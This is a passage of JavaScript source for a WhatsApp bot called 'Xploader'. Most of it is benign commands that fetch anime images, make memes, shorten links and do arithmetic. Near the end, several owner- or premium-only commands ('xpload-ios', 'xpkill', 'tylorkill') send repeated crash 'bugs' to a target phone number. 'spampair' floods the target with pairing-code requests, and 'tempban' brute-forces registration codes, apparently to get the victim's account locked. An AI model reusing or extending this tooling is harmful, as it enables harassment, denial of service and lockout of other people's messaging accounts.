//=================================================//
      case "animecry":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animewallpaper":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animekiss":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animehug":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animeneko":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animepat":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animeslap":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animecuddle":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
 //=================================================//
      case "animewaifu":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animenom":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animefoxgirl":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animetickle":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animegecg":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "dogwoof":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "8ballpool":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "goosebird":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animefeed":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animeavatar":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "lizardpic":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "catmeow":
        {
          waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "anime":
        {
          if (!text) return reply(`Which anime are you lookin for?`);
          const malScraper = require("mal-scraper");
          const anime = await malScraper
            .getInfoFromName(text)
            .catch(() => null);
          if (!anime) return reply(`Could not find`);
          let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`;
          await Xploader.sendMessage(
            m.chat,
            { image: { url: anime.picture }, caption: animetxt },
            { quoted: m }
          );
        }
        break;
//=================================================//
      case "animequote":
        {
          try {
            const res = await fetch("https://some-random-api.com/animu/quote");
            if (!res.ok) throw await res.text();
            const json = await res.json();
            const { sentence, character, anime } = json;
            const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`;
            Xploader.sendMessage(
              m.chat,
              { text: message },
              "extendedTextMessage",
              { quoted: m }
            );
          } catch (error) {
            console.error(error);
          }
        }
        break;
//=================================================//
//=================================================//
//=================================================//
case "smeme": {
 if (!text) return reply(`Reply to an image With Caption ${prefix + command}`)
if (!quoted) return reply(`Reply to an image With Caption ${prefix + command}`)
if (/image/.test(mime)) {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await Xploader.downloadAndSaveMediaMessage(qmsg)
let Bjirka = await TelegraPh(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${Bjirka}`
let pop = await Xploader.sendImageAsSticker(m.chat, smeme, m, {
packname: global.packname,
author: global.author
})
fs.unlinkSync(pop)
}
}
break;
//=================================================//
case "tinyurl": case "shortlink": {
if (!text) return reply(`*Example: ${prefix+command} https://instagram.com/heyits_tylor*`)
let anu = await axios.get(`https://tinyurl.com/api-create.php?url=${text}`)
reply(anu.data)
}
break;
//=================================================//
case "calculate":
case "calculator":
{
if (text.split("+")[0] && text.split("+")[1]) {
const value_one = Number(text.split("+")[0])
const value_two = Number(text.split("+")[1])
reply(`${value_one + value_two}`)
} else if (text.split("-")[0] && text.split("-")[1]) {
const value_one = Number(text.split("-")[0])
const value_two = Number(text.split("-")[1])
reply(`${value_one - value_two}`)
} else if (text.split("×")[0] && text.split("×")[1]) {
const value_one = Number(text.split("×")[0])
const value_two = Number(text.split("×")[1])
reply(`${value_one * value_two}`)
} else if (text.split("÷")[0] && text.split("÷")[1]) {
const value_one = Number(text.split("÷")[0])
const value_two = Number(text.split("÷")[1])
(`${value_one / value_two}`)
} else reply(`*Example* : ${prefix + command} 1 + 1`)
}
break
//=================================================//
     case "pairid":
        {
          if (!text) return reply("Please enter your phone number starting with country code e.g 254...");
          let d = await fetchJson(
            `https://bk9.fun/tools/PairId?q=${text}`
          );
          if (!d.BK9) {
            return reply(
              "An error occured!"
            );
          } else {
            reply(d.BK9);
          }
        }
        break;
//=================================================//
     case "pairfile":
        {
          if (!text) return reply("Please enter your phone number starting with country code e.g 254...");
          let d = await fetchJson(
            `https://bk9.fun/tools/PairFile?q=${text}`
          );
          if (!d.BK9) {
            return reply(
              "An error occured!"
            );
          } else {
            reply(d.BK9);
          }
        }
        break;
//=================================================//
     case "aidetector":
     case "gptdetector":
        {
          if (!text) return reply("Where is the text?.");
          let d = await fetchJson(
            `https://bk9.fun/tools/txtdetect?q=${text}`
          );
          if (!d.BK9) {
            return reply(
              "An error occured!"
            );
          } else {
            reply(`Language =  ${d.BK9.data.detected_language}\nIs human = ${d.BK9.data.isHuman}\nTotal words = ${d.BK9.data.textWords}\nAi words =  ${d.BK9.data.aiWords}\nFake percentage =  ${d.BK9.data.fakePercentage}\nFeedback =  ${d.BK9.data.feedback}`);
          }
        }
        break;
//=================================================//
      case "tourl":
      case "url":
        {
          let media = await Xploader.downloadAndSaveMediaMessage(qmsg);
          if (/image/.test(mime)) {
            let anu = await TelegraPh(media);
            reply(util.format(anu));
          } else if (!/image/.test(mime)) {
            let anu = await UploadFileUgu(media);
            reply(util.format(anu));
          }
          await fs.unlinkSync(media);
        }
        break;
//=================================================//
      case "image":
      case "img":
       {
          const searchTerm = args.join(" ");
        if (!searchTerm) return reply(`${pushname} Please provide a search term!`);

        const url = `https://www.exenoz.tech/api/pinterest?q=${encodeURIComponent(searchTerm)}`;

        try {
          const response = await axios.get(url);
          const pins = response.data;

          const numImages = 5;
          const randomPins = pins.sort(() => 0.5 - Math.random()).slice(0, numImages);

          randomPins.forEach(pin => {
            Xploader.sendMessage(m.chat, { image: { url: pin.url } }, { quoted: m });
          });
        } catch (error) {
          console.error('An error occured:', error);
          reply('An error occured. Please try again later.');
        }
      }
        break;
//=================================================//
      case "listonline": 
      case "onlinemembers":
        {
      if (!m.isGroup) return reply(mess.group);
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let online = [...Object.keys(store.presences[id]), botNumber]
        let liston = 1
        Xploader.sendText(m.chat, '  「 *Online Members In This Group* 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      }
        break;
//=================================================//
    case "addlimit":
      case "givelimit":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (!text)
            return reply(
              `*_Use ${prefix + command} number|limit amount_*`
            );
          usernya = text.split("|")[0];
          limitnya = text.split("|")[1];
          let oo = `${usernya}@s.whatsapp.net`;
          db.data.users[oo].limit += limitnya;
          reply(mess.done);
        }
        break;
      case "dellimit":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (!text)
            return reply(
              `*_Use ${prefix + command} number|limit amount_*`
            );
          usernya = text.split("|")[0];
          limitnya = text.split("|")[1];
          if (db.data.users[usernya + "@s.whatsapp.net"].limit < limitnya)
            return reply(`*_Limit Is Less Than ${limitnya}_*`);
          db.data.users[usernya + "@s.whatsapp.net"].limit -= limitnya;
          reply(mess.done);
        }
        break;
//=================================================//
case "xpload-ios":
if (!isPremium) return reply(mess.premium);
if (!XpBotOwner) return reply(mess.owner);
if (!q) return reply(`Use ${prefix}${command} 254......`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
targety = q.replace(/[^0-9]/g,'')
reply(`*Xploader Bot is sending bugs to ${targety}💀*`)
for (let i = 0; i < 40; i++) {
await buk1(Xploader, target, "Xploader bot says: RE-APP!", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(Xploader, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(Xploader, target, wanted)
}
reply(`*Xploader Bot has successfully sent bugs to ${targety}*`)
break;
//=================================================//
case "xpkill":
if (!isPremium) return reply(mess.premium);
if (!XpBotOwner) return reply(mess.owner);
if (!q) return reply(`Use ${prefix}${command} 254......`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
targety = q.replace(/[^0-9]/g,'')
reply(`*Xploader Bot is sending bugs to ${targety}💀*`)
for (let i = 0; i < 30; i++) {
await buk1(Xploader, target, "Xploader bot says: RE-APP!", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(Xploader, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(Xploader, target, wanted)
}
reply(`*Xploader Bot has successfully sent bugs to ${targety}*`)
break;
//=================================================//
//=================================================//
case "tylorkill":
case "xpload-andro":
if (!isPremium) return reply(mess.premium);
if (!XpBotOwner) return reply(mess.owner);
if (!q) return reply(`Use ${prefix}${command} 254......`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
targety = q.replace(/[^0-9]/g,'')
reply(`*Xploader Bot is sending bugs to ${targety}💀*`)
for (let i = 0; i < 50; i++) {
await buk1(Xploader, target, "Xploader bot says: RE-APP!", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(Xploader, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(Xploader, target, wanted)
}
reply(`*Xploader Bot has successfully sent bugs to ${targety}*`)
break;
//=================================================//
case 'spampair': {
if (!isPremium) return reply(mess.premium);
if (!XpBotOwner) return reply(mess.owner);
if (!q) return reply(`Use ${prefix}${command} 254......`)
				let [peenis, pepekk = "200"] = q.split("|")
				await reply(`*Xploader Bot is spamming pair code to the target!*`)
				let target = peenis.replace(/[^0-9]/g, '').trim()
				let {
					default: makeWaSocket,
					useMultiFileAuthState,
					fetchLatestBaileysVersion
				} = require('@whiskeysockets/baileys')
				let {
					state
				} = await useMultiFileAuthState('AkmalMods')
				let {
					version
				} = await fetchLatestBaileysVersion()
				let sucked = await makeWaSocket({
					auth: state,
					version,
					logger: pino({
						level: 'fatal'
					})
				})
				for (let i = 0; i < pepekk; i++) {
					await sleep(1500)
					let prc = await sucked.requestPairingCode(target)
					await console.log(`#Spammimg Pairing Code - No. : ${target} - Code : ${prc}`)
				}
				await sleep(15000)
			}
			break;
//=================================================//
case 'tempban': {
if (!isPremium) return reply(mess.premium);
if (!XpBotOwner) return reply(mess.owner);
if (args.length < 1) return reply(`Use ${prefix}${command} 254|7......`)
const args2 = args[0].split('|');
if (args2.length !== 2) return reply(`Use ${prefix}${command} 254|7......`)
				const XploaderCountryCode = args2[0];
				const xtarget = args2[1];
				const XploaderNumber = xtarget.replace('@s.whatsapp.net', '');
				const Xploadermerge = `${XploaderCountryCode}${xtarget}`
				const XploaderMention = Xploadermerge + '@s.whatsapp.net';
				await reply(`*Xploader Bot is spamming code!*`)
				try {
					const {
						stateXploader,
						saveCredsXploader
					} = await useMultiFileAuthState('./AkmalMods');
					const XploaderRequest = await Xploader.requestRegistrationCode({
						phoneNumber: '+' + XploaderCountryCode + `${XploaderNumber}`,
						phoneNumberCountryCode: XploaderCountryCode,
						phoneNumberNationalNumber: `${XploaderNumber}`,
						phoneNumberMobileCountryCode: 724,
						method: 'sms'
					});
				} catch (err) {}

				for (let i = 0; i < 10000; i++) {
					try {
						var XploaderPrefix = Math.floor(Math.random() * 999);
						var XploaderSuffix = Math.floor(Math.random() * 999);
						await Xploader.register(`${XploaderPrefix}-${XploaderSuffix}`);
					} catch (err) {
						console.log(`${XploaderPrefix}-${XploaderSuffix}`);
					}
				}
			}
			break;
//=================================================//

       default:
        if (budy.startsWith("=>")) {
          if (!XpBotOwner) return reply(mess.owner);
          function Return(sul) {
            sat = JSON.stringify(sul, null, 2);
            bang = util.format(sat);
            if (sat == undefined) {
              bang = util.format(sul);
            }
            return reply(bang);
          }
          try {
            reply(
              util.format(eval(`(async () => { return ${budy.slice(3)} })()`))
            );
          } catch (e) {
            reply(String(e));
          }
        }

        if (budy.startsWith(">")) {
          if (!XpBotOwner) return reply(mess.owner);
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== "string")
              evaled = require("util").inspect(evaled);
            await reply(evaled);
          } catch (err) {
            await reply(String(err));
          }
        }
        if (budy.startsWith("$")) {
          if (!XpBotOwner) return reply(mess.owner);
          exec(budy.slice(2), (err, stdout) => {
            if (err) return reply(err);
            if (stdout) return reply(stdout);
          });
        }
        if (isCmd && budy.toLowerCase() != undefined) {
          if (m.chat.endsWith("broadcast")) return;
          if (m.isBaileys) return;
          let msgs = global.db.data.database;
          if (!(budy.toLowerCase() in msgs)) return;
          Xploader.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {
            quoted: m,
          });
        }
    }
  } catch (err) {
    console.log(util.format(err));
     let e = String(err)
Xploader.sendMessage(Xploader.user.id, { text: `_*Sorry, couldn't perform that request; an error occurred*_\n_*If the error persists, please use ${prefix}reportbug (error message) to report the error to my developer.*_\n\nError=` + util.format(e), 
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                thumbnailUrl: "https://itzpire.com/file/270de20ea91c.jpeg",
                sourceUrl: `https://www.instagram.com/heyits_tylor?igsh=YzljYTk1ODg3Zg==`,
                mediaType: 1,
                renderLargerThumbnail: true,
              },
            },
          },
          {
            quoted: m,
})
	}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Updated ${__filename}`))
	delete require.cache[file]
	require(file)
});
